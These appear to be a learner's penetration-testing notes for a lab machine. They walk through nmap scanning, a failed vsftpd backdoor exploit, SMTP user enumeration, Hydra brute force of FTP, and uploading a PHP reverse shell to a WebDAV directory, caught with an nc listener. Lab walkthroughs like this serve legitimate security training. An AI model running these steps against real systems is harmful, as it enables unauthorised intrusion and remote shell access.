- cat /etc/hosts
- nmap -sV -sC -p 21 10.2.17.5
- ftp 10.2.17.5 21
- searchsploit vsftpd
- use exploit/unix/ftp/vsftpd_234_backdoor
- set RHOSTS 10.2.17.5
- run = dosent work
- get username auxiliary/scanner/smtp/smtp_enum


When we attempted to use the exploit (vsftpd_234_backdoor )for this version, we discovered that the administrator had applied a patch to the service. Despite the version remaining unchanged, the exploit did not function as expected.

which will come to our second solution is bruteforcing the ftp service

we can use smpt if it was open to identify usernames that we can build upon to bruteforce the ftp service and narrow down our options 

- msfconsole
- search smtp_enum
- set rhosts and run

- hydra -L service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.17.5 ftp
- open webapplication
- we found webDAV which looks intersting
- we can upload php reverse shell 
- we can check directory of /usr/share/webshells/php/  within this directory we have couple of reverse shells options
- cp /usr/share/webshells/php/php-reverse-shell.php .
- edit reverse shell with our LHOST AND LPORT
- we setup our listner in another tab
	- nc -lvnp 1234
- login ftp
- cd /var/www
- cd /dav (the only folder we have permission to upload file to)
- on our webapp the php should be there 
- click and listener will be activated
	- /bin/bash -i
	- we have better permissions
